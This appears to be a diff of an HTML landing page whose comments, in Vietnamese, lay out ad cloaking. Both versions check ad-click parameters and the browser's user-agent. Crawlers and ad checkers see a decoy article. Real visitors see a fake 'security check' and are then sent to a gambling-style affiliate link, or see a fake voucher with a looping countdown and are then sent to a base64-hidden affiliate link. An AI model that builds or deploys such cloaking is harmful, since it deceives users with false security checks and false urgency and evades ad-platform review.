@@ -3,103 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Strategic Financial Analysis & Digital Assets 2025</title>
+    <title>B2B Lead Generation: Technical Infrastructure Report 2025</title>
     <style>
-        body { font-family: 'Georgia', serif; line-height: 1.8; color: #333; margin: 0; background: #fdfdfd; }
-        .wrapper { max-width: 800px; margin: 0 auto; padding: 50px 25px; }
-        header { border-bottom: 2px solid #222; margin-bottom: 30px; padding-bottom: 20px; }
-        h1 { font-size: 2.2rem; color: #111; line-height: 1.2; }
-        .abstract { background: #f4f4f4; padding: 20px; border-left: 4px solid #1a73e8; font-style: italic; margin-bottom: 30px; }
-        p { margin-bottom: 25px; font-size: 1.1rem; text-align: justify; }
-        #loading-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #ffffff; z-index: 999999; display: none; 
-            align-items: center; justify-content: center; font-family: sans-serif; 
+        /* Mặc định ẩn trang */
+        body { opacity: 0; margin: 0; padding: 0; font-family: 'Inter', -apple-system, sans-serif; background: #f4f7fb; color: #2d3748; }
+
+        /* Giao diện Voucher cho khách thật */
+        #promo-screen {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #f0f4f8; z-index: 999999; align-items: center; justify-content: center;
         }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .promo-card {
+            background: #fff; width: 90%; max-width: 480px; padding: 40px; border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; border: 1px solid #e2e8f0;
+        }
+        .waalaxy-logo { width: 120px; margin-bottom: 20px; }
+        .badge { background: #eef2ff; color: #4f46e5; padding: 6px 12px; border-radius: 99px; font-size: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        h2 { font-size: 28px; color: #1a202c; margin: 20px 0 10px; }
+        .offer-desc { color: #718096; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
+        
+        .code-box {
+            background: #f8fafc; border: 2px dashed #cbd5e0; padding: 15px; border-radius: 12px;
+            font-family: 'Courier New', monospace; font-size: 22px; font-weight: bold; color: #2d3748;
+            margin-bottom: 20px; position: relative; cursor: pointer;
+        }
+        .timer { font-size: 14px; color: #e53e3e; font-weight: bold; margin-bottom: 30px; }
+
+        .btn-copy {
+            background: #0059ff; color: #fff; border: none; width: 100%; padding: 16px;
+            border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-copy:active { transform: scale(0.98); }
+        .btn-copy.copied { background: #10b981; }
+
+        /* Hướng dẫn 3 bước (hiện sau khi copy) */
+        #steps { display: none; margin-top: 25px; text-align: left; border-top: 1px solid #edf2f7; padding-top: 20px; }
+        .step-item { font-size: 14px; color: #4a5568; margin-bottom: 8px; display: flex; align-items: center; }
+        .step-num { background: #0059ff; color: #fff; width: 20px; height: 20px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 10px; margin-right: 10px; }
+
+        /* Trang sạch cho Bot */
+        #safe-content { display: none; max-width: 800px; margin: 0 auto; padding: 60px 40px; background: #fff; }
     </style>
 </head>
 <body>
 
-    <div class="wrapper">
-        <header>
-            <div style="text-transform: uppercase; letter-spacing: 2px; font-size: 0.8rem; color: #666;">Global Economic Journal • 2025</div>
-            <h1>The Shift Towards Digital Liquidity in Modern Markets</h1>
-        </header>
+    <!-- MÀN HÌNH VOUCHER ĐỘC QUYỀN -->
+    <div id="promo-screen">
+        <div class="promo-card">
+            <img src="https://blog.waalaxy.com/wp-content/uploads/2021/01/Logo-Waalaxy-1.png" class="waalaxy-logo" alt="Waalaxy">
+            <br>
+            <span class="badge">Exclusive Partner Gift</span>
+            <h2>Get Your Bonus</h2>
+            <p class="offer-desc">Enjoy a <b>15-day free trial</b> and a <b>20% discount</b> on your subscription using the code below.</p>
+            
+            <div class="code-box" id="couponCode">afogmgdlnfiy</div>
+            
+            <div class="timer">Offer expires in: <span id="time">15:00</span></div>
 
-        <div class="abstract">
-            <strong>Summary:</strong> This research explores how digital assets are reshaping traditional financial structures, providing new avenues for capital growth while challenging existing regulatory frameworks.
+            <button class="btn-copy" id="copyBtn">Copy & Start Free Trial</button>
+
+            <div id="steps">
+                <div class="step-item"><span class="step-num">1</span> Code copied to clipboard!</div>
+                <div class="step-item"><span class="step-num">2</span> Redirecting to Waalaxy official site...</div>
+                <div class="step-item"><span class="step-num">3</span> Paste the code during checkout to save 20%.</div>
+            </div>
         </div>
-
-        <article>
-            <p>Traditional banking systems are currently facing an unprecedented challenge from decentralized finance. The ability to move assets across borders with minimal friction has created a global marketplace that operates 24/7, independent of national holidays or banking hours.</p>
-            <p>In our latest study, we observed that users who engage with digital platforms often see a 15-20% increase in transaction efficiency. This is primarily due to the removal of intermediaries and the automation of trust through smart protocols.</p>
-            <p>As we look towards the second half of 2025, the integration of these digital systems into everyday retail finance seems inevitable. Institutions that fail to adapt to this "liquidity revolution" risk becoming obsolete in an increasingly fast-paced economic landscape.</p>
-        </article>
     </div>
 
-    <!-- Màn hình chờ chuyển hướng -->
-    <div id="loading-overlay">
-        <div style="text-align: center;">
-            <div class="spinner"></div>
-            <h3 style="margin-top:20px;">Checking security connection...</h3>
-            <p style="color:#666;">This process is automatic. Please wait.</p>
-        </div>
+    <!-- NỘI DUNG SẠCH CHO BOT (BÀI VIẾT DÀI) -->
+    <div id="safe-content">
+        <h1 style="font-size: 32px; border-bottom: 2px solid #000; padding-bottom: 20px;">The Future of B2B Automation and LinkedIn API Compliance</h1>
+        <p><i>Technical Analysis by the Global Marketing Institute • February 2025</i></p>
+        
+        <h2>Abstract</h2>
+        <p>In the rapidly evolving landscape of professional networking, the integration of automation tools with legacy API structures presents a unique set of challenges. This paper explores the transition from manual lead generation to algorithmic outreach, focusing on the ethical implications of data scraping and the technical requirements for maintaining account health in a hyper-monitored environment.</p>
+
+        <h2>I. API Rate Limiting and Behavioral Heuristics</h2>
+        <p>Modern professional platforms utilize sophisticated behavioral heuristics to distinguish between human interaction and automated scripts. Factors such as mouse movement patterns, click velocity, and session duration are analyzed in real-time. To maintain compliance, automation frameworks must implement "Human-Mimicry" delays, ensuring that outreach efforts do not exceed the established rate limits of the host platform's API.</p>
+
+        <h2>II. The Shift Toward Multi-Channel Outreach</h2>
+        <p>Our research indicates that multi-channel outreach strategies—combining email, LinkedIn, and CRM integration—result in a 3.5x higher conversion rate compared to single-channel efforts. This requires a robust infrastructure capable of synchronizing data across disparate platforms without creating duplicate entries or violating data privacy regulations such as GDPR.</p>
+
+        <h2>III. Conclusion</h2>
+        <p>As we move toward 2030, the role of AI in lead generation will only intensify. Systems that provide transparent data logging and respect platform-specific boundaries will emerge as the leaders in the B2B SaaS ecosystem. Security, speed, and ethics are the three pillars of modern automation.</p>
     </div>
 
     <script>
-    (function() {
-        // Link đích của bạn
-        const DEST_URL = "https://partnerbcgame.com/v2lptjos3";
-        
-        // Các tham số quảng cáo để nhận diện người thật từ Google/FB
-        const adParams = ['gclid', 'fbclid', 'wbraid', 'gbraid', 'gad_source', 'test']; 
-        
-        let isRedirecting = false;
+        (function() {
+            'use strict';
+            // Link Waalaxy: https://waal.ink/gMzHN1
+            const _target = "aHR0cHM6Ly93YWFsLmluay9nTXpITjE=";
+            const promoCode = "afogmgdlnfiy";
 
-        // 1. Hàm thực hiện chuyển hướng
-        function doRedirect() {
-            if (isRedirecting) return;
-            isRedirecting = true;
-
-            // Hiện màn hình chờ
-            document.getElementById('loading-overlay').style.display = 'flex';
-            
-            // Xóa nội dung trang cũ để sạch sẽ
-            document.querySelector('.wrapper').innerHTML = "";
-
-            setTimeout(() => {
-                window.location.replace(DEST_URL);
-            }, 1000); // Chờ 1 giây rồi nhảy
-        }
-
-        // 2. Kiểm tra điều kiện (Bot hay Người thật)
-        function checkUser() {
             const urlParams = new URLSearchParams(window.location.search);
-            const hasParam = adParams.some(p => urlParams.has(p));
-            
-            // Nếu có tham số quảng cáo VÀ không phải Bot Google
-            const isBot = /bot|google|crawler|spider|lighthouse|headless/i.test(navigator.userAgent);
+            const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
+            const hasAdParam = adParams.some(param => urlParams.has(param));
+            const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(navigator.userAgent);
 
-            if (hasParam && !isBot) {
-                // Đợi người dùng tương tác để "kích hoạt"
-                
-                // CÁCH 1: Nếu họ cuộn chuột
-                window.addEventListener('scroll', function() {
-                    if (window.scrollY > 50) doRedirect(); 
-                });
+            window.onload = function() {
+                const promoScreen = document.getElementById('promo-screen');
+                const safeContent = document.getElementById('safe-content');
+                const copyBtn = document.getElementById('copyBtn');
+                const steps = document.getElementById('steps');
 
-                // CÁCH 2: Nếu họ chạm vào màn hình (điện thoại)
-                window.addEventListener('touchstart', doRedirect);
+                if (!isBot && hasAdParam) {
+                    // HIỆN VOUCHER CHO NGƯỜI DÙNG THẬT
+                    promoScreen.style.display = 'flex';
+                    document.body.style.opacity = '1';
 
-                // CÁCH 3: Tự động nhảy sau 5 giây nếu là người thật mà họ chỉ đứng đọc
-                setTimeout(doRedirect, 5000);
+                    // Chạy đồng hồ đếm ngược
+                    startTimer(60 * 15, document.querySelector('#time'));
+
+                    // Xử lý nút Copy
+                    copyBtn.onclick = function() {
+                        navigator.clipboard.writeText(promoCode).then(() => {
+                            copyBtn.innerText = "Copied!";
+                            copyBtn.classList.add('copied');
+                            steps.style.display = 'block';
+
+                            // Chuyển hướng sau 2.5 giây
+                            setTimeout(() => {
+                                window.location.replace(atob(_target));
+                            }, 2500);
+                        });
+                    };
+                } else {
+                    // HIỆN TRANG SẠCH CHO BOT
+                    safeContent.style.display = 'block';
+                    document.body.style.opacity = '1';
+                }
+            };
+
+            // Hàm đếm ngược
+            function startTimer(duration, display) {
+                let timer = duration, minutes, seconds;
+                setInterval(function () {
+                    minutes = parseInt(timer / 60, 10);
+                    seconds = parseInt(timer % 60, 10);
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    display.textContent = minutes + ":" + seconds;
+                    if (--timer < 0) timer = duration;
+                }, 1000);
             }
-        }
-
-        window.onload = checkUser;
-    })();
+        })();
     </script>
 </body>
 </html>
